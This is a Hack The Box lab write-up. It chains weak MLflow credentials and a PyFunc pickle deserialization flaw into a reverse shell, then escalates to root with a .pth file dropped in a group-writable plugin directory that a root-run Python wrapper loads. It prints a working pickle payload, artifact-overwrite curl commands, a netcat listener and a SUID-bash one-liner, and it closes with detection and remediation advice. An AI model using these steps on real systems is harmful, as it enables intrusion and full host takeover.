---
title: "SmartHire: MLflow Deserialization and a Trusted Python Plugin Path to Root"
description: "A Medium Linux Hack The Box machine where weak MLflow credentials and a PyFunc deserialization flaw give a service shell, and a root-run Python plugin loader with a group-writable directory escalates to root."
type: case-study
platform: Hack The Box
content_type: machine
category: pentest
status: published-ready
addedAt: "2026-10-05"
tags:
  - htb
  - linux
  - machine
  - mlflow
  - deserialization
  - cve-2024-37054
  - python
  - sudo
  - privilege-escalation
objective: "Follow an MLflow model deserialization flaw to a web service shell, then abuse a root-run Python plugin loader with a writable directory to reach root."
tools:
  - nmap
  - gobuster
  - curl
  - jq
  - python3
  - nc
skill: "MLflow model deserialization exploitation and Python import-path privilege escalation."
outcome: "Code execution as the web service account and a root shell through a SUID binary created by a privileged plugin load."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux (Ubuntu), nginx-hosted recruitment application with an MLflow model service on a separate vhost |
| Starting position | Unauthenticated |
| Objective | Move from the public web surface to root through the application and its local management tooling |
| Outcome | Code execution as the web service account and a root shell via a privileged Python plugin load |

## From an MLflow artifact overwrite to root

SmartHire is a Medium Linux box built around a recruitment application and an MLflow model service exposed on a second virtual host. The application accepts CSV training data, registers a model in MLflow, and loads that model to answer predictions. The MLflow service is protected by weak basic-auth credentials, and the PyFunc model artifact can be overwritten through the MLflow artifact API. Because loading a PyFunc model deserializes its pickle, replacing the artifact with a crafted object executes code as the web service account. On the host, a sudo rule lets that account run a Python management wrapper as root. The wrapper imports every directory under a plugin path with `site.addsitedir()`, and one of those directories is group-writable, so a `.pth` file placed there runs as root on the next invocation and produces a SUID root shell.

Target and attacker addresses are replaced with role-based placeholders, and credential values are redacted; command syntax is preserved.

**Attack path:**

1. nginx web application on port 80 with a hidden `models` vhost.
2. Weak MLflow basic-auth credentials on the model service.
3. CSV upload registers a PyFunc model in MLflow.
4. Model artifact overwritten with a malicious pickle.
5. Deserialization on prediction loads the pickle as the web service account.
6. Sudo rule runs a Python management wrapper as root.
7. Writable plugin directory plus `site.addsitedir()` executes a `.pth` file as root.

## Target surfaces, vhost discovery, and objective

The target is a Hack The Box lab machine. Scope covered the two web surfaces, the MLflow API, and the local management tooling reachable from the service account. The objective was to identify how an upload feature handled a model artifact, then to follow the service account's root-run tooling to a privileged shell.

The note does not record the deployed MLflow version, so the version-to-CVE mapping is inferred from the successful model deserialization; no version string was recorded. Command output and the sudo policy are taken directly from the recorded session.

## Evidence: weak MLflow auth to a writable plugin path

### Enumeration and virtual host discovery

Observation: the full-port scan exposed SSH and an nginx HTTP service; the HTTP root redirects to a named host, and directory brute force added little beyond a login and registration page.

```bash
nmap <TARGET_IP> -p- -Pn -sC -sV -oN nmap/SmartHire-TCP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://<TARGET_DOMAIN>/
```

```bash
curl -I http://<TARGET_IP>
```

```text
Location: http://<TARGET_DOMAIN>/
```

Virtual host enumeration found a protected second host:

```bash
gobuster vhost \
  --url http://<TARGET_DOMAIN> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain
```

```text
models.<TARGET_DOMAIN> Status: 401 [Size: 137]
```

Significance: the `401` marks an existing virtual host whose access is protected by authentication. That host name maps to the MLflow model service, while the main host serves the recruitment application.

### MLflow model deserialization (CVE-2024-37054)

Observation: the application trains and registers a model when CSV training data is uploaded, and the MLflow Tracking API on the models host returns run metadata under weak basic-auth credentials. The credentials were `admin` with a weak password, which I redact here.

Action: create an account on the main application, upload a small training CSV to register a run, and read the newest run ID from the MLflow API.

```bash
curl -i -s -c cookies.txt \
  -X POST http://<TARGET_DOMAIN>/login \
  -d 'username=<TEST_USER>' \
  -d 'password=<TEST_PASSWORD>'
```

```bash
curl -s -b cookies.txt \
  -F 'file=@train.csv;type=text/csv' \
  http://<TARGET_DOMAIN>/upload_hiring_data | jq
```

```bash
RUN_ID=$(curl -s -u 'admin:<MLFLOW_PASSWORD>' \
  -H 'Content-Type: application/json' \
  -X POST http://models.<TARGET_DOMAIN>/api/2.0/mlflow/runs/search \
  -d '{"experiment_ids":["0"],"max_results":1}' | jq -r '.runs[0].info.run_id')
```

Significance: uploading a CSV causes the application to register a PyFunc model, and the MLflow artifact API lets any authenticated caller overwrite the artifact for that run. MLflow loads PyFunc models with pickle, and CVE-2024-37054 covers deserialization of untrusted data in that path.

Action: build a pickle whose `__reduce__` returns a shell command, using a placeholder command here. The recorded payload spawned a Python reverse shell to `<ATTACKER_IP>` on `<LPORT>`.

```python
import os
import pickle

class PickleRCE:
    def __reduce__(self):
        return (os.system, ("<REVERSE_SHELL_COMMAND>",))

with open("python_model.pkl", "wb") as f:
    f.write(pickle.dumps(PickleRCE()))
```

Overwrite the run's model artifact through the MLflow artifact API:

```bash
curl -s -u 'admin:<MLFLOW_PASSWORD>' \
  -X PUT \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @python_model.pkl \
  "http://models.<TARGET_DOMAIN>/api/2.0/mlflow-artifacts/artifacts/0/${RUN_ID}/artifacts/model/python_model.pkl"
```

```bash
nc -lvnp <LPORT>
```

Then request a prediction, which makes the application load the overwritten model:

```bash
curl -s -b cookies.txt \
  -F 'file=@pred.csv;type=text/csv' \
  http://<TARGET_DOMAIN>/predict
```

Result: the listener returned a shell as the web service account.

```text
<WEB_SVC_ACCOUNT>@<TARGET_HOSTNAME>:/var/www$
```

Significance: the trust boundary sits between the upload feature and the model runtime. The application treats its own artifact store as trusted, so overwriting an artifact is equivalent to running code in the process that loads it.

### Sudo policy and plugin loader review

Observation: the service account can run a management wrapper as root without a password.

```bash
sudo -l
```

```text
User <WEB_SVC_ACCOUNT> may run the following commands on <TARGET_HOSTNAME>:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

The wrapper sets up import paths from a plugin directory before it dispatches any action:

```python
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

I checked the plugin directories for write permissions, since a writable directory under a root-run import path would be decisive.

```bash
find /opt/tools/mlflow_ctl -maxdepth 3 -printf '%m %u %g %p\n'
```

```text
755 root root /opt/tools/mlflow_ctl/plugins
755 root root /opt/tools/mlflow_ctl/plugins/core
775 root devs /opt/tools/mlflow_ctl/plugins/dev
```

Significance: `site.addsitedir()` processes `.pth` files in each directory it adds, and a `.pth` line beginning with `import` is executed as Python. The top-level plugin directory is not writable, but `plugins/dev` is group-writable, which puts executable code on a root import path.

### Privilege escalation through a `.pth` file

Action: place a `.pth` file that copies `bash` and sets the SUID bit, then trigger the sudo-allowed wrapper.

```bash
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")' \
  > /opt/tools/mlflow_ctl/plugins/dev/pwn.pth
```

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

```text
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up 48 minutes'
```

Result: the status action completed normally, and the `.pth` file had already run as root during path setup.

```bash
/tmp/rootbash -p
```

```text
rootbash-5.1#
```

Significance: the sudo rule looks narrow because it names one script, but the script's behavior expands that trust to every directory it imports. A single writable directory on that path turns a fixed command into root code execution.

## Outcome: model deserialization to root

The path crossed two boundaries. The first was the application's own artifact store: the model service let an authenticated caller replace the pickle the application later deserialized, so an upload feature became code execution. The second was the root-run management tool: a fixed sudo command imported a writable directory, so a `.pth` file became root execution.

Two limitations shape the record. The note does not record the MLflow version, so the exact affected version is inferred from behavior. The privilege escalation is shown through the resulting shell prompt; the file-creation and wrapper commands are recorded, and the SUID binary is the observed proof.

## Recommendations: artifact integrity, plugin paths, and sudo scope

The deserialization flaw is a trust and version problem.

- *Recommendation:* do not let untrusted callers write model artifacts, and keep MLflow at a version that addresses CVE-2024-37054. The artifact API should require authorization scoped to the owning user, and the model service should not accept duplicate artifact writes for a run it did not create.
- *Detection:* alert on artifact overwrites for an existing run, and on model loads that spawn a shell or connect outward from the prediction process.
- *Validation:* confirm the deployed MLflow version against the advisory and test whether an authenticated client can replace another run's artifact.

The privilege escalation is an import-path problem.

- *Recommendation:* treat every directory on a root process's Python import path as privileged code. The plugin directory and its children must be owned by root and not writable by any other user or group. Python's `site` documentation is explicit that `.pth` lines beginning with `import` are executed.
- *Detection:* alert on new `.pth` files in application paths, and on writes to plugin or site directories by non-root accounts.
- *Validation:* after a deploy, check that no directory passed to `site.addsitedir()` is writable by the service account.

The sudo rule is a scope problem.

- *Recommendation:* avoid wildcard sudo rules around Python wrappers. A rule that allows `mlflowctl.py *` grants the wrapper's full import behavior, so its effective authority is wider than the command list suggests. Use fixed subcommands and an import path the caller cannot modify.
- *Detection:* review sudo rules for interpreters and scripts that expand trust to files or directories the caller can write.
- *Validation:* test each sudo-allowed command with a writable directory added to its import path.

## References

- [Hack The Box: SmartHire](https://app.hackthebox.com/machines/SmartHire)
- [NVD: CVE-2024-37054, MLflow PyFunc deserialization](https://nvd.nist.gov/vuln/detail/CVE-2024-37054)
- [Python: the `site` module and `.pth` files](https://docs.python.org/3/library/site.html)
- [MLflow tracking API](https://mlflow.org/docs/latest/rest-api.html)
- [Gobuster](https://github.com/OJ/gobuster)
- [Nmap](https://nmap.org/)
